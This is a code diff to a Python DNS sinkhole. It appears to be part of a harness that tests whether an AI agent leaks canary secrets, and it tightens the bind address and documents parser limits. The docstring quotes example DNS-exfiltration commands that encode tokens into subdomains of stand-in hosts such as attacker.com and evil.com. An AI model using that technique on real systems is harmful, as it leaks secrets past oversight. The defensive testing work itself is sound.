@@ -9,11 +9,16 @@ in DNS subdomain lookups:
     nslookup sk-CANARY-1234.attacker.com
     dig CANARY_1784845313_7pi65u.evil.com
 
-The container's DNS resolver is configured to point to this sinkhole
-(host.docker.internal:5353) so all DNS queries route here.
+fake_agent.py's DNS exfil channel sends its query directly to this sinkhole
+(host.docker.internal:5353) via a raw UDP packet -- NOT via the container's
+OS-level DNS resolver. Standard resolvers always query port 53, and this
+sinkhole deliberately listens on 5353 to avoid requiring root/admin
+privileges, so there is no way to transparently redirect real system DNS
+traffic here without elevated privileges. The container's --add-host flag
+(see build_replica.py) only guarantees host.docker.internal resolves, so
+fake_agent.py can reach this sinkhole by address.
 
 Design: Pure Python stdlib (socket). No external dependencies.
-Port 5353 is used instead of 53 to avoid requiring root/admin privileges.
 All queries are sinkholed (respond with 127.0.0.1) -- nothing resolves.
 
 Usage (standalone for testing):
@@ -32,6 +37,17 @@ from method2.interceptors.intercept_hits import log_intercept_hit, scan_text_for
 
 DEFAULT_PORT = 5353
 
+# Bind address for the sinkhole. 127.0.0.1 (not 0.0.0.0) so this port isn't
+# reachable from the LAN during a test run -- verified empirically (both
+# TCP and UDP) that a Docker Desktop container (macOS/Windows) CAN still
+# reach a 127.0.0.1-bound host service through host.docker.internal, via
+# Docker Desktop's vpnkit networking layer. CAVEAT: this is a Docker
+# Desktop behavior, not Docker Engine/Linux -- on native Linux Docker,
+# host.docker.internal resolves to the real bridge gateway IP, and a
+# 127.0.0.1-only bind would NOT be reachable from a container there. See
+# the matching note in egress_interceptor.py.
+BIND_HOST = "127.0.0.1"
+
 
 def parse_dns_query_name(data: bytes) -> str:
     """
@@ -42,6 +58,21 @@ def parse_dns_query_name(data: bytes) -> str:
         Means:   www.google.com
 
     We extract and join all labels to reconstruct the full domain name.
+
+    KNOWN LIMITATION: this does not follow DNS name-compression pointers
+    (a label byte with its top two bits set, i.e. >= 0xC0, meaning "the
+    rest of this name is at byte offset X earlier in the message"). A
+    compressed query would parse as truncated/garbled rather than the
+    real name. Not implemented because: (1) compression is rare in the
+    QUESTION section of real outgoing queries in the first place (it's far
+    more common in response sections a client sends to itself), and (2)
+    the only queries this sinkhole ever actually receives are the
+    simple, always-uncompressed ones fake_agent.py's own _build_dns_query()
+    constructs (see sandbox_agent/fake_agent.py) -- so there is no live
+    code path that would ever exercise compression here. If this sinkhole
+    is ever pointed at a real, uncontrolled DNS client, this would need a
+    proper pointer-following implementation (with loop/bounds protection,
+    since pointers are attacker-influenced input).
     """
     labels = []
     offset = 12  # Skip DNS header (12 bytes)
@@ -127,7 +158,7 @@ class DNSSinkhole:
 
     def _serve(self):
         try:
-            self.sock.bind(("0.0.0.0", self.port))
+            self.sock.bind((BIND_HOST, self.port))
         except OSError as e:
             print(f"[pillar_b] WARNING: could not bind to port {self.port}: {e}")
             print(f"[pillar_b] DNS sinkhole will not be active for this run.")
